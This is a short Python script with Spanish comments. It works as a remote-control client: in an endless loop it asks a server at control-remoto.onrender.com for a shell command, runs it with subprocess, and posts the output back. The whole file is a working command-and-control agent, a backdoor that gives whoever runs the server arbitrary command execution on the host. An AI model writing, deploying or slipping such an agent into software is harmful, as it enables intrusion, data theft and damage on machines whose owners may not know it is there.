import requests
import subprocess
import time

SERVER = "https://control-remoto.onrender.com/comando"  # <-- Cámbialo a tu URL real
ID = "cliente1"  # Puedes cambiar el nombre para diferenciar clientes

def obtener_comando():
    try:
        res = requests.get(f"{SERVER}/get/{ID}", timeout=10)
        return res.text.strip()
    except Exception as e:
        print(f"[!] Error al obtener comando: {e}")
        return ""

def enviar_respuesta(salida):
    try:
        requests.post(f"{SERVER}/send/{ID}", data=salida.encode(), timeout=10)
    except Exception as e:
        print(f"[!] Error al enviar salida: {e}")

print(f"[+] Cliente activo: {ID} — esperando comandos...")

while True:
    comando = obtener_comando()
    if comando:
        print(f"[>] Ejecutando: {comando}")
        try:
            resultado = subprocess.getoutput(comando)
        except Exception as e:
            resultado = f"[!] Error al ejecutar: {str(e)}"
        enviar_respuesta(resultado)
    time.sleep(5)
